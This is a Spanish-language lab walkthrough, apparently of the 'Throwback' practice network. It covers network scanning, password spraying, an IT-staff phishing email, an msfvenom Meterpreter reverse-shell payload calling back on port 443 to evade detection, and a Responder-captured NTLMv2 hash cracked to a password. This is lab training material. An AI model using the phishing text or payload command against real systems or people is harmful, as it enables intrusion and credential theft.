Tres maquinas estan expuestas al público:
```
THROWBACK-PROD
THROWBACK-FW01
THROWBACK-MAIL
```
Escaneamos la red completa para obtener la siguiente info
```
Nmap scan report for THROWBACK-FW01
PORT    STATE SERVICE
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
443/tcp open  https

Nmap scan report for 10.200.27.139
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for THROWBACK-PROD
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi

Nmap scan report for THROWBACK-MAIL
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
993/tcp open  imaps
```
Vamos a repetir los escaneos pero ahora individualmente y con mayor profundidad esto nos dara varios datos importantes
```
|   DNS_Domain_Name: THROWBACK.local
```
Enumeramos las máquinas ahora de manera individual y encontramos una low level account, una lista de direcciones de correo y un firewall con default creds.

Obtuvimos RCE en la máquina del firewall y las creds para el usuario: HumphreyW

Tras esto hicimos password spray sobre el servidor email encontrando varias cuentas, tenemos un hallazgo inportante relaccionado con cambios de contraseña pero nada mas a simple vista.

Con tanto mail es buen momento para poner en marcha una campaña de Phishing
```
URGENT! Update your acount

To keep the acces to this network before the next week you must previously
run this program on your PC to update some things like your AD access, key
excahnges and more thechnical IT stuff

ATT:
The IT STAFF

```
Y a esto le adjuntamos un payload de msfvenom, otra vez vamos a coger un puerto comun a fin de evitar un posible IDS o reglas de firewall respecto a las conexiones
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f exe > AccUpgrader.exe
```
Con esto podremos obtener acceso a THROWBACK-WS01

## Responder
Usar el responder conectados a la network nos da un hash que podemos crackear 
```
[SMB] NTLMv2-SSP Client   : 10.200.27.219
[SMB] NTLMv2-SSP Username : THROWBACK\PetersJ
[SMB] NTLMv2-SSP Hash     : PetersJ::THROWBACK:9d504b6228de9553:974354DD45D1C476D2C8B93CED377D56:0101000000000000C0653150DE09D201E399642B68B106E4000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000000000000020000007C4A6344164A0BC4F09495306E41A4ECA7801C8B50EBE600E1FBE5DE3BD6A2F0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00350030002E00320035002E0035000000000000000000
```
Lo crackeamos con rockyou y oneruletorulealls obtenemos la pass Throwback317
